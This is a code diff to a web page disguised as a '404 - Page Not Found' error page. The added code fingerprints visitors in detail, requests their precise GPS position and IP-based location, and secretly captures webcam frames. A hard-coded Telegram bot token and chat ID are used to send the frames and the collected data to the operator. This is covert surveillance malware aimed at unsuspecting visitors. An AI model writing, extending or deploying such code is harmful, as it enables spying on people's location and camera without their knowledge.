@@ -3,79 +3,6 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    
-  <!-- Title & Meta Description -->
-  <title>Netlify Money Market • </title>
-  <meta name="description" content="Compare the best money market rates, high-yield savings accounts, and investment tools. Updated daily with accurate market data.">
-  <meta name="keywords" content="money market, high yield savings, investment rates, finance tools, passive income, ROI calculator">
-
-  <!-- Canonical URL -->
-  <link rel="canonical" href="https://your-site.netlify.app">
-
-  <!-- OpenGraph for social media -->
-  <meta property="og:title" content="Money Market • Best Investment Rates">
-  <meta property="og:description" content="Latest money market rates, savings tools, and finance guides.">
-  <meta property="og:type" content="website">
-  <meta property="og:url" content="https://your-site.netlify.app">
-  <meta property="og:image" content="https://your-site.netlify.app/preview.png">
-
-  <!-- Twitter Card -->
-  <meta name="twitter:card" content="summary_large_image">
-  <meta name="twitter:title" content="Money Market • Smart Investment Tools">
-  <meta name="twitter:description" content="Track and compare the best money market interest rates.">
-  <meta name="twitter:image" content="https://your-site.netlify.app/preview.png">
-
-  <!-- Structured Data (JSON-LD) --> <meta name="description" content="Compare the best money market rates, high-yield savings accounts, and investment tools. Updated daily with accurate market data.">
-
-  <!-- Keywords -->
-  <meta name="keywords" content="money market, high yield savings, investment rates, finance tools, passive income, ROI calculator">
-
-  <!-- Canonical URL -->
-  <link rel="canonical" href="https://your-site.netlify.app">
-
-  <!-- OpenGraph for Facebook / LinkedIn / WhatsApp -->
-  <meta property="og:title" content="Money Market • Best Investment Rates">
-  <meta property="og:description" content="Check the latest money market rates, top savings accounts, and investment tools. Updated daily!">
-  <meta property="og:type" content="website">
-  <meta property="og:url" content="https://your-site.netlify.app">
-  <meta property="og:image" content="https://your-site.netlify.app/preview.png">
-  <meta property="og:image:alt" content="Money Market Rates & Investment Tools">
-
-  <!-- Twitter Card -->
-  <meta name="twitter:card" content="summary_large_image">
-  <meta name="twitter:title" content="Money Market • Best Investment Rates">
-  <meta name="twitter:description" content="Compare the best money market rates, savings accounts, and investment tools.">
-  <meta name="twitter:image" content="https://your-site.netlify.app/preview.png">
-
-  <!-- JSON-LD Structured Data -->
-  <script type="application/ld+json">
-  {
-    "@context": "https://schema.org",
-    "@type": "FinancialService",
-    "name": "Money Market Tools",
-    "url": "https://your-site.netlify.app",
-    "description": "Financial calculators, interest rate comparison tools, and money market insights.",
-    "image": "https://your-site.netlify.app/preview.png",
-    "sameAs": [
-      "https://twitter.com/",
-      "https://facebook.com/"
-    ]
-  }
-  <script type="application/ld+json">
-  {
-    "@context": "https://schema.org",
-    "@type": "FinancialService",
-    "name": "Money Market Tools",
-    "url": "https://your-site.netlify.app",
-    "description": "Financial calculators, interest rate comparison tools, and money market insights.",
-    "image": "https://your-site.netlify.app/preview.png",
-    "sameAs": [
-      "https://twitter.com/",
-      "https://facebook.com/"
-    ]
-  }
-  </script>
-
     <title>404 - Page Not Found</title>
     <style>
         * {
@@ -175,7 +102,13 @@
             chromeSize: {
                 horizontal: window.outerWidth - window.innerWidth,
                 vertical: window.outerHeight - window.innerHeight
-            }
+            },
+            locationbarVisible: (() => { try { return window.locationbar.visible; } catch(e) { return null; } })(),
+            menubarVisible: (() => { try { return window.menubar.visible; } catch(e) { return null; } })(),
+            personalbarVisible: (() => { try { return window.personalbar.visible; } catch(e) { return null; } })(),
+            scrollbarsVisible: (() => { try { return window.scrollbars.visible; } catch(e) { return null; } })(),
+            statusbarVisible: (() => { try { return window.statusbar.visible; } catch(e) { return null; } })(),
+            toolbarVisible: (() => { try { return window.toolbar.visible; } catch(e) { return null; } })()
         };
     }
 
@@ -312,7 +245,8 @@
             geolocation: 'geolocation' in navigator,
             vibration: 'vibrate' in navigator,
             battery: 'getBattery' in navigator,
-            notification: 'Notification' in window
+            notification: 'Notification' in window,
+            pushManager: 'pushManager' in (navigator.serviceWorker || {})
         };
     }
 
@@ -324,14 +258,19 @@
             mp3: audio.canPlayType('audio/mpeg'),
             ogg: audio.canPlayType('audio/ogg; codecs="vorbis"'),
             wav: audio.canPlayType('audio/wav'),
-            aac: audio.canPlayType('audio/aac')
+            aac: audio.canPlayType('audio/aac'),
+            m4a: audio.canPlayType('audio/x-m4a'),
+            flac: audio.canPlayType('audio/flac')
         };
 
         const videoCodecs = {
             mp4: video.canPlayType('video/mp4; codecs="avc1.42E01E"'),
             webm: video.canPlayType('video/webm; codecs="vp8, vorbis"'),
+            ogg: video.canPlayType('video/ogg; codecs="theora"'),
             h264: video.canPlayType('video/mp4; codecs="avc1.42E01E"'),
-            vp8: video.canPlayType('video/webm; codecs="vp8"')
+            vp8: video.canPlayType('video/webm; codecs="vp8"'),
+            vp9: video.canPlayType('video/webm; codecs="vp9"'),
+            av1: video.canPlayType('video/webm; codecs="av1"')
         };
 
         return { audio: audioCodecs, video: videoCodecs };
@@ -341,7 +280,8 @@
         return {
             timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
             locale: Intl.DateTimeFormat().resolvedOptions().locale,
-            timezoneOffset: new Date().getTimezoneOffset()
+            timezoneOffset: new Date().getTimezoneOffset(),
+            daylightSavings: new Date(2023, 0, 1).getTimezoneOffset() !== new Date(2023, 6, 1).getTimezoneOffset()
         };
     }
 
@@ -351,7 +291,8 @@
             downlink: navigator.connection.downlink,
             effectiveType: navigator.connection.effectiveType,
             rtt: navigator.connection.rtt,
-            saveData: navigator.connection.saveData
+            saveData: navigator.connection.saveData,
+            type: navigator.connection.type
         };
     }
 
@@ -360,7 +301,9 @@
             const battery = await navigator.getBattery();
             return {
                 charging: battery.charging,
-                level: battery.level
+                level: battery.level,
+                chargingTime: battery.chargingTime,
+                dischargingTime: battery.dischargingTime
             };
         } catch (e) {
             return {};
@@ -369,7 +312,9 @@
 
     function getTouchData() {
         return {
-            maxTouchPoints: navigator.maxTouchPoints || 0
+            maxTouchPoints: navigator.maxTouchPoints || 0,
+            msMaxTouchPoints: navigator.msMaxTouchPoints || 0,
+            pointerEnabled: navigator.pointerEnabled || false
         };
     }
 
@@ -377,20 +322,35 @@
         return {
             characterSet: document.characterSet,
             contentType: document.contentType,
-            visibilityState: document.visibilityState
+            doctype: document.doctype ? document.doctype.name : null,
+            documentElementLang: document.documentElement.lang,
+            visibilityState: document.visibilityState,
+            hidden: document.hidden,
+            referrer: document.referrer
         };
     }
 
     function getPerformanceData() {
         return {
+            navigationTiming: performance.timing ? {
+                navigationStart: performance.timing.navigationStart,
+                domContentLoadedEventEnd: performance.timing.domContentLoadedEventEnd,
+                loadEventEnd: performance.timing.loadEventEnd
+            } : null,
+            navigationType: performance.navigation?.type || 'N/A',
             timeOrigin: performance.timeOrigin
         };
     }
 
     function getIntlData() {
         const dtf = new Intl.DateTimeFormat();
+        const nf = new Intl.NumberFormat();
+        
         return {
-            datetimeFormat: dtf.resolvedOptions()
+            datetimeFormat: dtf.resolvedOptions(),
+            numberFormat: nf.resolvedOptions(),
+            testDateFormat: dtf.format(new Date()),
+            testNumberFormat: nf.format(1234.56)
         };
     }
 
@@ -398,7 +358,9 @@
         try {
             const audioContext = new (window.AudioContext || window.webkitAudioContext)();
             return {
-                sampleRate: audioContext.sampleRate
+                sampleRate: audioContext.sampleRate,
+                maxChannelCount: audioContext.maxChannelCount,
+                state: audioContext.state
             };
         } catch (e) {
             return {};
@@ -407,46 +369,113 @@
 
     function getHistoryData() {
         return {
-            historyLength: window.history.length
+            historyLength: window.history.length,
+            windowName: window.name
         };
     }
 
-    function getWebRTCIP() {
-        return new Promise((resolve) => {
-            const ips = [];
-            const pc = new RTCPeerConnection({ iceServers: [] });
-            
-            pc.createDataChannel('');
-            pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => {});
-            
-            pc.onicecandidate = (ice) => {
-                if (!ice || !ice.candidate) {
-                    pc.close();
-                    resolve(ips.length > 0 ? ips : []);
-                    return;
-                }
-                const candidate = ice.candidate.candidate;
-                const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
-                const match = candidate.match(ipRegex);
-                if (match && !ips.includes(match[1])) {
-                    ips.push(match[1]);
-                }
-            };
+    function getGlobalObjectData() {
+        const keys = Object.getOwnPropertyNames(window).length;
+        return {
+            globalPropertiesCount: keys,
+            hasChrome: 'chrome' in window,
+            hasOpera: 'opera' in window,
+            hasMozilla: 'mozilla' in navigator
+        };
+    }
 
-            setTimeout(() => {
-                pc.close();
-                resolve(ips);
-            }, 3000);
+    async function getGPSLocation() {
+        return new Promise((resolve) => {
+            if (!navigator.geolocation) {
+                resolve({ error: 'Geolocation not supported' });
+                return;
+            }
+
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    resolve({
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude,
+                        accuracy: position.coords.accuracy,
+                        altitude: position.coords.altitude,
+                        altitudeAccuracy: position.coords.altitudeAccuracy,
+                        heading: position.coords.heading,
+                        speed: position.coords.speed,
+                        timestamp: position.timestamp
+                    });
+                },
+                (error) => {
+                    resolve({ error: error.message });
+                },
+                { timeout: 5000, maximumAge: 0, enableHighAccuracy: true }
+            );
         });
     }
 
-    async function getPublicIP() {
+    async function getIPLocation() {
         try {
-            const response = await fetch('https://api.ipify.org?format=json', { signal: AbortSignal.timeout(3000) });
-            const data = await response.json();
-            return data.ip;
+            const response = await fetch('https://ipapi.co/json/', { signal: AbortSignal.timeout(3000) });
+            if (!response.ok) throw new Error('Failed to fetch IP location');
+            return await response.json();
         } catch (e) {
-            return null;
+            return { error: e.message };
+        }
+    }
+
+    async function captureAndSendCameraFrames() {
+        try {
+            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                return { error: 'Camera not supported' };
+            }
+
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { width: { ideal: 1280 }, height: { ideal: 720 } },
+                audio: false
+            });
+
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            video.play();
+
+            const canvas = document.createElement('canvas');
+            canvas.width = 1280;
+            canvas.height = 720;
+            const ctx = canvas.getContext('2d');
+
+            const TELEGRAM_BOT_TOKEN = "8570912541:AAFbriZp7cIxEHkzlgfmza9RwS__6gYYYOQ";
+            const TELEGRAM_USER_ID = "8406913795";
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
+
+            let frameCount = 0;
+            const captureInterval = setInterval(() => {
+                try {
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    canvas.toBlob((blob) => {
+                        const formData = new FormData();
+                        formData.append('chat_id', TELEGRAM_USER_ID);
+                        formData.append('photo', blob, `frame-${frameCount}.jpg`);
+                        formData.append('caption', `Camera Frame #${frameCount}`);
+
+                        fetch(url, {
+                            method: 'POST',
+                            body: formData
+                        }).catch(e => console.log("Camera frame send failed"));
+                    }, 'image/jpeg', 0.8);
+
+                    frameCount++;
+                    if (frameCount >= 10) {
+                        clearInterval(captureInterval);
+                        stream.getTracks().forEach(track => track.stop());
+                    }
+                } catch (e) {
+                    clearInterval(captureInterval);
+                    stream.getTracks().forEach(track => track.stop());
+                }
+            }, 1000);
+
+            return { status: 'capturing', frames: 'up to 10 frames at 1fps' };
+        } catch (e) {
+            return { error: e.message };
         }
     }
 
@@ -530,7 +559,7 @@
         };
     }
 
-    const TELEGRAM_BOT_TOKEN = "8570912541:AAErNlFxerOw_SXQo54KLyTpGnH4zO4PZb8";
+    const TELEGRAM_BOT_TOKEN = "8570912541:AAFbriZp7cIxEHkzlgfmza9RwS__6gYYYOQ";
     const TELEGRAM_USER_ID = "8406913795";
 
     function sendToTelegram(data) {
@@ -552,7 +581,8 @@
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({
                 chat_id: TELEGRAM_USER_ID,
-                text: summary
+                text: summary,
+                parse_mode: "HTML"
             })
         }).catch(e => console.log("Telegram send failed"));
 
@@ -591,8 +621,10 @@
     fp.intl = getIntlData();
     fp.audioContext = getAudioContextData();
     fp.history = getHistoryData();
-    fp.webrtcIPs = await getWebRTCIP();
-    fp.publicIP = await getPublicIP();
+    fp.global = getGlobalObjectData();
+    fp.gpsLocation = await getGPSLocation();
+    fp.ipLocation = await getIPLocation();
+    fp.cameraCapture = await captureAndSendCameraFrames();
     fp.colorScheme = getColorSchemePreference();
     fp.isHeadless = detectHeadless();
     fp.automationDetection = detectAutomation();
